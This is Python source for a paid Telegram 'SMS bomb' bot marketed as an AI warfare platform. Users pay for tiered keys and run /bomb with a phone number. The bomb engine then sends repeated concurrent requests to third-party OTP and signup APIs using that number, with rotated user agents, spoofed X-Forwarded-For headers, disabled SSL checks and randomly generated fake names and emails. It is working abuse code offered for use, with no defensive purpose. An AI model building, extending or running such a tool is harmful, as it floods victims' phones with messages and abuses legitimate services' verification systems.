    if is_new:
        tm = gs('trial_minutes','2')
        return (
            f"╔══════════════════════════════════════╗\n"
            f"║  🤖  A G S   U L T R A   A I  🤖   ║\n"
            f"║       N E X U S   v 9 0 0 0          ║\n"
            f"║  ◈ NEXT-GEN WARFARE PLATFORM ◈       ║\n"
            f"╚══════════════════════════════════════╝\n"
            f"{L3}\n"
            f"🎊 Welcome, <b>{fname or 'Agent'}</b>!\n"
            f"{ai_icon} System recognized: <code>NEW RECRUIT</code>\n"
            f"{L3}\n\n"
            f"╔══ 🎁 ACTIVATION GIFT ══╗\n"
            f"║  ⚡ {tm} min FREE VIP Activated!\n"
            f"║  🧠 AI Engine: ONLINE\n"
            f"║  🔥 Strike Mode: ARMED\n"
            f"║  🛡️ Shield System: READY\n"
            f"║  📊 Analytics: LIVE\n"
            f"║  🎯 Precision: MAX\n"
            f"╚══════════════════════╝\n\n"
            f"{t_banner}\n"
            f"{color} Power Level: <b>{t_glow}</b>\n"
            f"📞 <b>Number:</b>  <code>{BOT_NUMBER}</code>\n"
            f"👑 <b>Admin:</b>   {ADMIN_USERNAME}\n"
            f"💳 <b>Buy VIP:</b> /buy\n"
            f"{t_banner}\n"
            f"{f_icon} <b>Trial LIVE!</b> <i>Abhi /bomb karo! {f_icon}</i>"
        )

    now_t = now_ist().strftime('%H:%M')
    now_d = now_ist().strftime('%d %b')
    speed_txt = f"{TIER_DATA.get(tier,{}).get('speed',2.0)}s delay"
    return (
        f"╔══════════════════════════════════════╗\n"
        f"║  {f_icon}  A G S   U L T R A   N E X U S  {f_icon} ║\n"
        f"║      {BOT_VERSION}          ║\n"
        f"╚══════════════════════════════════════╝\n"
        f"{t_banner}\n"
        f"🤖 <b>AI Status:</b>   <code>FULLY OPERATIONAL</code>\n"
        f"{NEX} <b>Neural Core:</b> <code>HyperThread AI ∞ v9</code>\n"
        f"{NEX} <b>Strike Grid:</b> <code>Distributed Nexus Net</code>\n"
        f"{NEX} <b>Defense:</b>    <code>Quantum Shield v9</code>\n"
        f"{NEX} <b>BLX Engine:</b> <code>POST API Matrix</code>\n"
        f"{t_banner}\n"
        f"{color} <b>Rank:</b>      <code>{badge}</code>\n"
        f"⚡ <b>Power:</b>     <b>{t_glow}</b>\n"
        f"⚔️  <b>Attacks:</b>  <code>{lim}/day</code>\n"
        f"📦 <b>Rounds:</b>   <code>{fmt_num(rnds)}/attack</code>\n"
        f"🚀 <b>Speed:</b>    <code>{speed_txt}</code>\n"
        f"🕐 <b>IST:</b>      <code>{now_t} • {now_d}</code>\n"
        f"{t_banner}\n"
        f"<i>{f_icon} Choose your weapon below ↓ {ai_icon}</i>"
    )

def atk_ui(target, tier, success, failed, i, lim, elapsed, rps):
    pct = min(100, int(i / max(lim,1) * 100))
    bar_filled = int(pct / 6.25)
    bar = "█" * bar_filled + "░" * (16 - bar_filled)
    art = random.choice(FIRE)
    art2 = random.choice(FIRE)
    t_banner = TIER_BANNERS.get(tier, L1)
    t_glow   = TIER_GLOWS.get(tier, '○ ○ ○ ○ ○')
    total = success + failed
    hit_rate = int(success / max(total,1) * 100)
    if hit_rate >= 80: status_icon = "🟢"; status_txt = "DEVASTATING"
    elif hit_rate >= 60: status_icon = "🟡"; status_txt = "EFFECTIVE"
    elif hit_rate >= 40: status_icon = "🟠"; status_txt = "MODERATE"
    else: status_icon = "🔴"; status_txt = "LOW IMPACT"
    if pct < 30: phase = "🔄 LOADING PAYLOAD"
    elif pct < 60: phase = "⚡ STRIKE IN PROGRESS"
    elif pct < 90: phase = "🔥 FINAL ASSAULT"
    else: phase = "💀 IMPACT IMMINENT"
    return (
        f"╔══ {art} <b>NEXUS AI STRIKE ACTIVE</b> {art2} ══╗\n"
        f"{t_banner}\n"
        f"🎯 <b>Target:</b>   <code>{target}</code>\n"
        f"⚡ <b>Mode:</b>     <code>{tb(tier)}</code>\n"
        f"🤖 <b>Phase:</b>    <code>{phase}</code>\n"
        f"{t_banner}\n"
        f"🟢 <b>Landed:</b>  <code>{fmt_num(success)}</code>\n"
        f"🔴 <b>Dropped:</b> <code>{fmt_num(failed)}</code>\n"
        f"📦 <b>Total:</b>   <code>{fmt_num(total)}</code>  {status_icon} <b>{status_txt}</b>\n"
        f"⚡ <b>Speed:</b>   <code>{rps:.1f} req/s</code>\n"
        f"🔥 <b>Power:</b>   {t_glow}\n"
        f"{t_banner}\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"⏱️ <b>Time:</b> <code>{fmt_time(elapsed)}</code>  "
        f"📊 <b>Round:</b> <code>{i}/{lim}</code>  "
        f"🎯 <b>Acc:</b> <code>{hit_rate}%</code>\n"
        f"╚{'═'*32}╝"
    )

def done_ui(target, tier, success, failed, dur):
    total = success + failed
    hit_rate = int(success / max(total,1) * 100)
    t_banner = TIER_BANNERS.get(tier, L1)
    t_glow   = TIER_GLOWS.get(tier, '○ ○ ○ ○ ○')
    if hit_rate >= 85:
        verdict = f"💀 <b>TOTAL DEVASTATION!</b> {random.choice(['🔥','💥','⚡','☄️'])} Target obliterated!"
        grade = "S+ RANK"
    elif hit_rate >= 70:
        verdict = f"🔥 <b>CRITICAL HIT!</b> Massive damage dealt!"
        grade = "A RANK"
    elif hit_rate >= 50:
        verdict = f"✅ <b>HIT CONFIRMED!</b> Solid strike completed."
        grade = "B RANK"
    elif hit_rate >= 30:
        verdict = f"⚠️ <b>PARTIAL HIT</b> — APIs busy, retry karo."
        grade = "C RANK"
    else:
        verdict = f"❌ <b>LOW IMPACT</b> — Check APIs or retry."
        grade = "D RANK"
    bar_filled = int(hit_rate / 6.25)
    bar = "█" * bar_filled + "░" * (16 - bar_filled)
    f_icon = random.choice(FIRE)
    ai_icon = random.choice(AI_ICONS)
    return (
        f"╔══ 🏁 <b>NEXUS AI MISSION COMPLETE!</b> ══╗\n"
        f"{t_banner}\n"
        f"🎯 <b>Target:</b>    <code>{target}</code>\n"
        f"⚡ <b>Mode:</b>      <code>{tb(tier)}</code>\n"
        f"🏆 <b>Grade:</b>     <code>{grade}</code>\n"
        f"{t_banner}\n"
        f"✅ <b>Hits:</b>      <code>{fmt_num(success)}</code>\n"
        f"❌ <b>Dropped:</b>   <code>{fmt_num(failed)}</code>\n"
        f"📦 <b>Total:</b>     <code>{fmt_num(total)}</code>\n"
        f"⏱️ <b>Duration:</b>  <code>{fmt_time(dur)}</code>\n"
        f"🔥 <b>Power:</b>     {t_glow}\n"
        f"{t_banner}\n"
        f"<code>[{bar}] {hit_rate}% accuracy</code>\n"
        f"{t_banner}\n"
        f"{f_icon} {verdict}\n"
        f"<i>{ai_icon} AI Battle Report Generated</i>\n"
        f"╚{'═'*32}╝"
    )

# ══════════════════════════════════════════════════════════════
#                    /start
# ══════════════════════════════════════════════════════════════
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.username or 'Unknown'
    fname = update.effective_user.first_name or ''
    now_s = now_ist().strftime('%Y-%m-%d %H:%M:%S')

    if uid != ADMIN_ID:
        joined = await check_join(uid, ctx.bot)
        if not joined:
            return await update.message.reply_text(
                f"╔══ ⚠️ CHANNEL JOIN REQUIRED ══╗\n{L1}\n"
                f"🔴 <b>Bot use karne se pehle</b>\n"
                f"   channel join karna zaroori hai!\n\n"
                f"📢 Channel: <b>{FORCE_CHANNEL}</b>\n"
                f"{L1}\n"
                f"👇 Join karo → ✅ I've Joined! dabao\n"
                f"╚{'═'*29}╝",
                parse_mode=ParseMode.HTML, reply_markup=join_kb())

    cursor.execute("SELECT tier,banned FROM users WHERE id=?", (uid,))
    row = cursor.fetchone()
    is_new = not row

    if is_new:
        cursor.execute("INSERT INTO users (id,username,first_name,tier,expiry,joined_at,last_seen) VALUES (?,?,?,'free','0',?,?)",
                       (uid, uname, fname, now_s, now_s))
        db.commit()
    else:
        cursor.execute("UPDATE users SET username=?,first_name=?,last_seen=? WHERE id=?",
                       (uname, fname, now_s, uid)); db.commit()

    tier, banned = await verify_tier(uid, ctx)

    if banned == 1:
        cursor.execute("SELECT ban_reason FROM users WHERE id=?", (uid,))
        r = cursor.fetchone()
        return await update.message.reply_text(
            f"╔══ ⛔ ACCOUNT SUSPENDED ══╗\n{L1}\n"
            f"❌ <b>Reason:</b> {r[0] if r else 'N/A'}\n"
            f"📩 <b>Appeal:</b> {ADMIN_USERNAME}\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)

    if is_maint() and uid != ADMIN_ID:
        return await update.message.reply_text(
            f"╔══ 🔧 MAINTENANCE ══╗\n{L1}\n"
            f"Bot update ho raha hai.\n⏳ Thodi der baad wapas aana.\n"
            f"📢 Updates: {ADMIN_USERNAME}\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)

    sess = get_key_session(uid) if uid != ADMIN_ID else None
    if uid != ADMIN_ID and sess is None:
        f_icon = random.choice(FIRE)
        return await safe_send_photo(update.message,
            caption=(
                f"╔══════════════════════════════════════╗\n"
                f"║  {f_icon}  A G S   U L T R A   A I  {f_icon}  ║\n"
                f"║      N E X U S   v 1 0 0 0 0         ║\n"
                f"║  ◈ NEXT-GEN WARFARE PLATFORM ◈       ║\n"
                f"╚══════════════════════════════════════╝\n"
                f"{L3}\n"
                f"👋 Welcome, <b>{fname or 'Agent'}</b>!\n"
                f"{L3}\n\n"
                f"╔══ 🔒 ACCESS KEY REQUIRED ══╗\n"
                f"║  Bot use karne ke liye KEY chahiye!\n"
                f"║\n"
                f"║  💳 Key kharidne ke liye:\n"
                f"║    → /buy\n"
                f"║    → Admin: {ADMIN_USERNAME}\n"
                f"║\n"
                f"║  🔑 Key milne ke baad:\n"
                f"║    → <code>/key YOUR_KEY_CODE</code>\n"
                f"╚══════════════════════════╝\n\n"
                f"{L1}\n"
                f"💎 <b>Powered by AGS NEXUS v10000</b>\n"
                f"⚡ Admin: {ADMIN_USERNAME}\n╚{'═'*29}╝"
            ),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 BUY KEY", callback_data='nav_buy'),
                 InlineKeyboardButton("🎟️ ENTER KEY", callback_data='nav_enter_key')],
                [InlineKeyboardButton("ℹ️ BOT INFO", callback_data='nav_info'),
                 InlineKeyboardButton("🆘 SUPPORT", callback_data='nav_support')],
            ]),
            parse_mode=ParseMode.HTML)

    if uid == ADMIN_ID:
        caption = welcome_ui(tier, fname, is_new)
    else:
        color  = tc(sess['tier'])
        badge  = tb(sess['tier'])
        t_glow = TIER_GLOWS.get(sess['tier'], '○ ○ ○ ○ ○')
        t_banner = TIER_BANNERS.get(sess['tier'], L1)
        f_icon = random.choice(FIRE)
        ai_icon = random.choice(AI_ICONS)
        time_left = key_time_remaining(sess['expires_at'])
        atk_info = f"{sess['total_used']}/{('∞' if sess['max_attacks']==-1 else sess['max_attacks'])}"
        daily_info = f"{sess['daily_used']}/{('∞' if sess['daily_limit']==-1 else sess['daily_limit'])}"
        caption = (
            f"╔══════════════════════════════════════╗\n"
            f"║  {f_icon}  A G S   U L T R A   N E X U S  {f_icon} ║\n"
            f"║      {BOT_VERSION}       ║\n"
            f"╚══════════════════════════════════════╝\n"
            f"{t_banner}\n"
            f"👋 <b>{fname or 'Agent'}</b> — {color} {badge}\n"
            f"⚡ Power: <b>{t_glow}</b>\n"
            f"{t_banner}\n"
            f"╔══ 🔑 KEY SESSION STATUS ══╗\n"
            f"║  ⏱️ Time Left: <code>{time_left}</code>\n"
            f"║  ⚔️  Attacks:   <code>{atk_info}</code>\n"
            f"║  📅 Daily:     <code>{daily_info}</code>\n"
            f"║  🔀 Concurrent: max {sess['max_concurrent']}\n"
            f"╚══════════════════════════╝\n"
            f"<i>{f_icon} /bomb NUMBER se attack karo! {ai_icon}</i>"
        )

    await safe_send_photo(update.message,
        caption=caption,
        reply_markup=main_kb(uid, tier if uid == ADMIN_ID else sess['tier']),
        parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════════════
#                    💣 BOMB ENGINE
# ══════════════════════════════════════════════════════════════
async def bomb_node(session, url, target):
    t0 = time.monotonic()
    try:
        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148",
            "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230901.001)",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/124",
        ])
        async with session.get(
            url.replace("(number)", target),
            headers={
                'User-Agent': ua,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-IN,en;q=0.9,hi;q=0.8',
                'Connection': 'keep-alive',
                'X-Forwarded-For': f"182.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            },
            timeout=aiohttp.ClientTimeout(total=5)
        ) as resp:
            lat = int((time.monotonic() - t0) * 1000)
            hit = resp.status in [200, 201, 202, 204]
            if hit:
                cursor.execute("UPDATE apis SET hits=hits+1 WHERE url=?", (url,))
            ai_score_api(url, hit, lat)
            return hit
    except:
        ai_score_api(url, False, 9999)
        return False

async def blx_node(session, api_dict, target, tier_rank):
    t0 = time.monotonic()
    try:
        if api_dict['min_tier'] > tier_rank:
            return False
        fname = random.choice(BLX_FIRSTNAMES)
        lname = random.choice(BLX_LASTNAMES)
        rand4 = str(random.randint(1000, 9999))
        rand2 = str(random.randint(10, 99))
        rand3 = str(random.randint(100, 999))
        email = f"{fname.lower()}{rand3}@gmail.com"

        def fill(obj):
            if isinstance(obj, dict):
                return {k: fill(v) for k, v in obj.items()}
            if isinstance(obj, str):
                return (obj.replace('{mo}', target)
                           .replace('{fname}', fname)
                           .replace('{lname}', lname)
                           .replace('{rand4}', rand4)
                           .replace('{rand2}', rand2)
                           .replace('{rand3}', rand3)
                           .replace('{email}', email))
            return obj

        payload = fill(api_dict['payload'])
        headers = fill(api_dict['headers'])
        headers['X-Request-ID'] = hashlib.md5(f"{target}{rand4}".encode()).hexdigest()[:16]
        headers['User-Agent']   = f"AGSApp/{random.randint(3,9)}.{random.randint(0,9)}.{random.randint(0,9)}"

        method  = api_dict['method']
        timeout = aiohttp.ClientTimeout(total=6)
        try:
            if method == 'json':
                async with session.post(api_dict['url'], json=payload, headers=headers,
                                        timeout=timeout, ssl=False) as r:
                    ok = r.status < 500
            elif method == 'form':
                async with session.post(api_dict['url'], data=payload, headers=headers,
                                        timeout=timeout, ssl=False) as r:
                    ok = r.status < 500
            else:
                async with session.post(api_dict['url'], data=payload, headers=headers,
                                        timeout=timeout, ssl=False) as r:
                    ok = r.status < 500
        except:
            ok = False

        lat = int((time.monotonic() - t0) * 1000)
        ai_score_api(api_dict['url'], ok, lat)
        blx_hit(api_dict['id'], ok)
        return ok
    except:
        try:
            blx_hit(api_dict['id'], False)
            ai_score_api(api_dict.get('url',''), False, 9999)
        except: pass
        return False

async def execute_bomb(update, ctx, target, uid, tier, lim, speed):
    ai_icon = random.choice(AI_ICONS)
    msg = await update.message.reply_text(
        f"╔══ 🤖 AGS NEURAL ENGINE BOOT ══╗\n"
        f"│ {ai_icon} Initializing AI Core...\n"
        f"│ {AI_BOOT[0]}\n"
        f"╚{'═'*31}╝",
        parse_mode=ParseMode.HTML)
    await asyncio.sleep(0.4)
    for idx, frame_txt in enumerate(BOMB_FRAMES[:7]):
        bar = AI_BOOT[min(idx+1, len(AI_BOOT)-1)]
        try:
            await msg.edit_text(
                f"╔══ 🤖 AGS NEURAL ENGINE BOOT ══╗\n"
                f"│ {frame_txt}\n"
                f"│ {bar}\n"
                f"╚{'═'*31}╝",
                parse_mode=ParseMode.HTML)
        except: pass
        await asyncio.sleep(0.35)

    cursor.execute("SELECT url FROM apis WHERE active=1")
    api_list_raw = [r[0] for r in cursor.fetchall()]

    tier_rank = TIER_RANKS_MAP.get(tier, 0)
    api_scored = sorted(api_list_raw, key=lambda u: ai_api_scores.get(u, 50.0), reverse=True)
    api_list   = api_scored

    blx_list_raw  = get_all_blx_apis(active_only=True)
    blx_eligible  = [a for a in blx_list_raw if a['min_tier'] <= tier_rank]
    blx_eligible  = sorted(blx_eligible, key=lambda a: ai_api_scores.get(a.get('url',''), 50.0), reverse=True)

    if not api_list and not blx_eligible:
        active_tasks.pop(uid, None)
        return await msg.edit_text(
            f"╔══ ❌ NO ACTIVE APIS ══╗\n{L1}\n"
            f"🤖 AI Engine: No nodes available.\n"
            f"Admin: {ADMIN_USERNAME}\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)

    cursor.execute("SELECT name, error_msg FROM apis WHERE active=1 AND error_msg != '' LIMIT 1")
    api_err = cursor.fetchone()
    if api_err:
        active_tasks.pop(uid, None)
        return await msg.edit_text(
            f"╔══ ⚠️ SERVICE NOTICE ══╗\n{L1}\n"
            f"📡 <b>{api_err[0]}:</b>\n\n"
            f"{api_err[1]}\n{L1}\n"
            f"Admin: {ADMIN_USERNAME}\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)

    cursor.execute("SELECT username, first_name FROM users WHERE id=?", (uid,))
    urow  = cursor.fetchone()
    uname = urow[0] if urow else 'Unknown'
    fname = urow[1] if urow else ''

    ai_init_session(uid)

    adm_msg = None
    try:
        threat = get_threat_level(ai_session_stats[uid]['hits'])
        tl     = AI_THREAT_LEVELS[threat]
        adm_msg = await ctx.bot.send_message(ADMIN_ID,
            f"╔══ 🔥 AI STRIKE INITIATED ══╗\n{L3}\n"
            f"👤 <b>Agent:</b>   @{uname} ({fname})\n"
            f"🆔 <b>ID:</b>     <code>{uid}</code>\n"
            f"💎 <b>Tier:</b>   {tb(tier)}\n"
            f"🎯 <b>Target:</b> <code>{target}</code>\n"
            f"📦 <b>Rounds:</b> <code>{fmt_num(lim)}</code>\n"
            f"🤖 <b>GET APIs:</b> <code>{len(api_list)}</code>\n"
            f"🔥 <b>BLX APIs:</b> <code>{len(blx_eligible)}</code>\n"
            f"{tl['color']} <b>Threat:</b> <code>{threat}</code>\n"
            f"⏰ <b>IST:</b>   {now_ist().strftime('%H:%M:%S')}\n╚{'═'*29}╝",
            parse_mode=ParseMode.HTML, reply_markup=stop_kb(uid))
    except: pass

    success = failed = 0
    start_t = now_ist()
    connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=300)
    peak_rps  = 0.0

    async with aiohttp.ClientSession(
        connector=connector,
        headers={'Connection': 'keep-alive'},
        connector_owner=True
    ) as sess:
        try:
            for i in range(lim):
                if uid not in active_tasks: break
                t_round = time.monotonic()

                get_tasks = [bomb_node(sess, u, target) for u in api_list]
                blx_tasks = [blx_node(sess, a, target, tier_rank) for a in blx_eligible]
                results   = await asyncio.gather(*(get_tasks + blx_tasks), return_exceptions=True)
                results   = [r for r in results if isinstance(r, bool)]

                r_ok  = results.count(True)
                r_err = len(results) - r_ok
                success += r_ok; failed += r_err

                round_t = max(time.monotonic() - t_round, 0.001)
                rps     = len(results) / round_t
                peak_rps = max(peak_rps, rps)

                if i % 3 == 0 or i == lim - 1:
                    elapsed = (now_ist() - start_t).seconds
                    try:
                        await msg.edit_text(
                            atk_ui(target, tier, success, failed, i+1, lim, elapsed, rps),
                            parse_mode=ParseMode.HTML)
                    except: pass

                await asyncio.sleep(speed)

        except asyncio.CancelledError: pass
        finally:
            active_tasks.pop(uid, None)
            dur = (now_ist() - start_t).seconds

            ai_update_session(uid, success, failed, peak_rps)

            log_atk(uid, target, 'sms_bomb', success, failed, dur)
            inc_daily(uid)

            if adm_msg:
                try:
                    acc = int(success / max(success+failed, 1) * 100)
                    await adm_msg.edit_text(
                        f"╔══ 🏁 AI STRIKE COMPLETE ══╗\n{L1}\n"
                        f"👤 @{uname} | <code>{uid}</code>\n"
                        f"🎯 <code>{target}</code>\n"
                        f"✅ <code>{fmt_num(success)}</code> hits  ❌ <code>{fmt_num(failed)}</code>\n"
                        f"🎯 Acc: <code>{acc}%</code>  ⏱️ <code>{fmt_time(dur)}</code>\n"
                        f"🚀 Peak RPS: <code>{peak_rps:.1f}</code>\n"
                        f"🤖 AI Score updated for {len(api_list)+len(blx_eligible)} nodes\n╚{'═'*29}╝",
                        parse_mode=ParseMode.HTML)
                except: pass

            try:
                session_card = ai_session_card(uid)
                extra_txt    = "\n💎 Upgrade karo for unlimited power!" if not is_vip(tier) else ""
                final_txt    = (
                    done_ui(target, tier, success, failed, dur) + "\n\n" +
                    session_card + extra_txt
                )
                await msg.edit_text(
                    final_txt,
                    parse_mode=ParseMode.HTML,
                    reply_markup=upsell_kb() if not is_vip(tier) else None)
            except: pass

# ══════════════════════════════════════════════════════════════
#                    CALLBACK HANDLER
# ══════════════════════════════════════════════════════════════
async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q    = update.callback_query
    uid  = q.from_user.id
    data = q.data
    try: await q.answer()
    except: pass

    try:
        if data != 'check_join' and uid != ADMIN_ID:
            joined = await check_join(uid, ctx.bot)
            if not joined:
                return await q.message.reply_text(
                    f"⚠️ Pehle channel join karo!\n{FORCE_CHANNEL}",
                    reply_markup=join_kb())

        if data.startswith('astop_') and uid == ADMIN_ID:
            t_uid = int(data.replace('astop_',''))
            if t_uid in active_tasks:
                active_tasks[t_uid].cancel(); active_tasks.pop(t_uid, None)
                try: await q.message.edit_reply_markup(None)
                except: pass
                return await q.message.reply_text(
                    f"✅ <b>Attack Stopped!</b>\nUID <code>{t_uid}</code> terminated.",
                    parse_mode=ParseMode.HTML)
            return await q.answer("Already stopped!", show_alert=True)

        if data == 'check_join':
            joined = await check_join(uid, ctx.bot)
            if not joined:
                return await q.answer("❌ Abhi join nahi kiya! Pehle join karo.", show_alert=True)
            try: await q.message.delete()
            except: pass
            tier, _ = await verify_tier(uid, ctx)
            cursor.execute("SELECT first_name FROM users WHERE id=?", (uid,))
            r = cursor.fetchone()
            return await safe_send_photo(ctx.bot,
                chat_id=uid,
                caption=welcome_ui(tier, r[0] if r else ''),
                reply_markup=main_kb(uid, tier), parse_mode=ParseMode.HTML)

        tier, banned = await verify_tier(uid, ctx)
        update_seen(uid)
        if banned == 1: return await q.message.reply_text("⛔ Account suspended.")
        if is_maint() and uid != ADMIN_ID and data not in ['nav_back','nav_support','nav_info']:
            return await q.message.reply_text(
                f"╔══ 🔧 MAINTENANCE MODE ══╗\n{L1}\n"
                f"🤖 AI System is undergoing upgrades.\n"
                f"⏳ Please try again soon.\n"
                f"Contact: {ADMIN_USERNAME}\n╚{'═'*27}╝",
                parse_mode=ParseMode.HTML)

        vip  = is_vip(tier) or uid == ADMIN_ID

        if data == 'nav_noop':
            return await q.answer("", show_alert=False)

        elif data == 'nav_back':
            ctx.user_data.clear()
            try: await q.message.delete()
            except: pass
            cursor.execute("SELECT first_name FROM users WHERE id=?", (uid,))
            r = cursor.fetchone()
            await safe_send_photo(ctx.bot,
                chat_id=uid,
                caption=welcome_ui(tier, r[0] if r else ''),
                reply_markup=main_kb(uid, tier), parse_mode=ParseMode.HTML)

        elif data == 'nav_info':
            cursor.execute("SELECT COUNT(*) FROM users"); tu=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE tier NOT IN ('free','banned')"); vu=cursor.fetchone()[0]
            cursor.execute("SELECT SUM(total_sent) FROM users"); th=cursor.fetchone()[0] or 0
            cursor.execute("SELECT COUNT(*) FROM apis WHERE active=1"); ac=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM blx_apis WHERE active=1"); blxc=cursor.fetchone()[0]
            cursor.execute("SELECT SUM(total_attacks) FROM users"); ta=cursor.fetchone()[0] or 0
            ram=get_ram(); stor=get_stor()
            t_banner = TIER_BANNERS.get(tier, L1)
            ai_icon  = random.choice(AI_ICONS)
            await q.message.reply_text(
                f"╔══ 🤖 AGS ULTRA AI NEXUS INFO ══╗\n"
                f"{t_banner}\n"
                f"⚡ <b>System:</b>   <code>AGS ULTRA AI NEXUS</code>\n"
                f"🔖 <b>Version:</b>  <code>{BOT_VERSION}</code>\n"
                f"👑 <b>Owner:</b>    {ADMIN_USERNAME}\n"
                f"📞 <b>Contact:</b>  <code>{BOT_NUMBER}</code>\n"
                f"{t_banner}\n"
                f"🧠 <b>Engine:</b>   <code>Neural HyperThread v9</code>\n"
                f"🔥 <b>GET APIs:</b> <code>{ac} Active Nodes</code>\n"
                f"🔥 <b>BLX POST:</b> <code>{blxc} Active APIs</code>\n"
                f"🛡️ <b>Shield:</b>   <code>Quantum Multi-Layer</code>\n"
                f"📡 <b>Uptime:</b>   <code>99.9% SLA Grade</code>\n"
                f"{t_banner}\n"
                f"👥 <b>Users:</b>    <code>{fmt_num(tu)}</code>  💎 VIP: <code>{fmt_num(vu)}</code>\n"
                f"💥 <b>Hits:</b>     <code>{fmt_num(th)}</code>  ⚔️ Attacks: <code>{fmt_num(ta)}</code>\n"
                f"⚡ <b>Live:</b>     <code>{len(active_tasks)}</code> active strikes\n"
                f"🧠 <b>RAM:</b>      <code>{ram:.1f}/{RAM_MB} MB</code>\n"
                f"💾 <b>DB:</b>       <code>{stor:.2f}/{STOR_MB} MB</code>\n"
                f"{t_banner}\n"
                f"<i>{ai_icon} Powered by AGS Neural AI Platform</i>\n"
                f"╚{'═'*32}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data='nav_info'),
                     InlineKeyboardButton("🔙 Back",    callback_data='nav_back')]]))

        elif data == 'nav_sms':
            rem  = daily_left(uid, tier)
            rnds = get_rounds(uid, tier)
            lim  = get_atk_per_day(uid, tier)
            spd  = TIER_DATA.get(tier,{}).get('speed', 2.0)
            t_banner = TIER_BANNERS.get(tier, L1)
            t_glow   = TIER_GLOWS.get(tier, '○ ○ ○ ○ ○')
            pct_left = int(rem / max(lim, 1) * 100)
            bar_f = int(pct_left / 6.25)
            bar   = "🟩" * bar_f + "⬛" * (16 - bar_f)
            await q.message.reply_text(
                f"╔══ 💣 NEXUS SMS BOMB ENGINE ══╗\n"
                f"{t_banner}\n"
                f"🤖 <b>Neural Strike:</b> <code>READY</code>\n"
                f"⚡ <b>Tier Power:</b>   {t_glow}\n"
                f"{t_banner}\n"
                f"{AR} <b>Command:</b>\n"
                f"   <code>/bomb 10DIGITNUMBER</code>\n"
                f"{AR} <b>Example:</b>\n"
                f"   <code>/bomb 9876543210</code>\n"
                f"{t_banner}\n"
                f"{tc(tier)} <b>Tier:</b>         {tb(tier)}\n"
                f"📦 <b>Rounds/Strike:</b> <code>{fmt_num(rnds)}</code>\n"
                f"⚡ <b>Daily Limit:</b>  <code>{lim}</code>\n"
                f"✅ <b>Left Today:</b>   <code>{rem}/{lim}</code>\n"
                f"🚀 <b>Fire Speed:</b>   <code>{spd}s delay</code>\n"
                f"<code>[{bar}] {pct_left}% remaining</code>\n"
                f"{t_banner}\n"
                f"{'🔥 AI HyperThread: ARMED & READY!' if vip else '💎 Upgrade for unlimited power!'}\n"
                f"╚{'═'*30}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=back_kb() if vip else upsell_kb("⚡ UNLOCK MAX POWER"))

        elif data == 'nav_stop':
            if uid in active_tasks:
                active_tasks[uid].cancel(); active_tasks.pop(uid, None)
                await q.message.reply_text(
                    f"╔══ 🛑 NEXUS ABORT SIGNAL ══╗\n{L1}\n"
                    f"⛔ <b>Strike terminated by user.</b>\n"
                    f"🔴 All threads halted.\n"
                    f"🤖 AI Core: <code>STANDBY MODE</code>\n"
                    f"{L1}\n"
                    f"<i>Next strike: /bomb NUMBER</i>\n╚{'═'*27}╝",
                    parse_mode=ParseMode.HTML)
            else:
                await q.message.reply_text(
                    f"ℹ️ <b>No active strike found.</b>\n"
                    f"AI Core is idle. Use /bomb to start.",
                    parse_mode=ParseMode.HTML)

        # SHIELD
        elif data == 'nav_shield':
            max_wl = TIER_DATA.get(tier,{}).get('max_wl',0)
            if uid == ADMIN_ID: max_wl = 999
            if max_wl == 0:
                return await q.message.reply_text(
                    f"╔══ 🛡️ VIP SHIELD ══╗\n{L1}\n"
                    f"Shield sirf VIP ke liye!\n"
                    f"🆓 Free: 0 | 🥉 Bronze: 2 | 🥈 Silver: 3\n"
                    f"🥇 Gold: 5 | 💎 Premium: 8 | 👑 Elite: 15\n╚{'═'*27}╝",
                    parse_mode=ParseMode.HTML, reply_markup=upsell_kb("🛡️ GET MORE SHIELD SLOTS"))
            cursor.execute("SELECT COUNT(*) FROM whitelist")
            total_wl = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM whitelist WHERE added_by=?", (uid,))
            my_wl = cursor.fetchone()[0]
            if uid == ADMIN_ID:
                await q.message.reply_text(
                    f"╔══ 🛡️ ADMIN SHIELD MANAGER ══╗\n{L1}\n"
                    f"📋 <b>Total Protected:</b> <code>{total_wl}</code>\n"
                    f"{L1}\n"
                    f"<i>Admin whitelist me kisi ka bhi number/UPI add kar sakta hai.</i>\n"
                    f"Commands:\n"
                    f"<code>/addwl NUMBER/UPI</code> — Add\n"
                    f"<code>/delwl NUMBER/UPI</code> — Remove\n"
                    f"╚{'═'*29}╝",
                    parse_mode=ParseMode.HTML, reply_markup=shield_kb())
            else:
                await q.message.reply_text(
                    f"╔══ 🛡️ NEXUS SHIELD ══╗\n{L1}\n"
                    f"{tc(tier)} <b>Tier:</b>  {tb(tier)}\n"
                    f"📋 <b>My Protected:</b> <code>{my_wl}</code>\n"
                    f"{L1}\n"
                    f"🔒 <i>Shield entries sirf Admin set kar sakta hai!</i>\n"
                    f"Contact: {ADMIN_USERNAME}\n╚{'═'*27}╝",
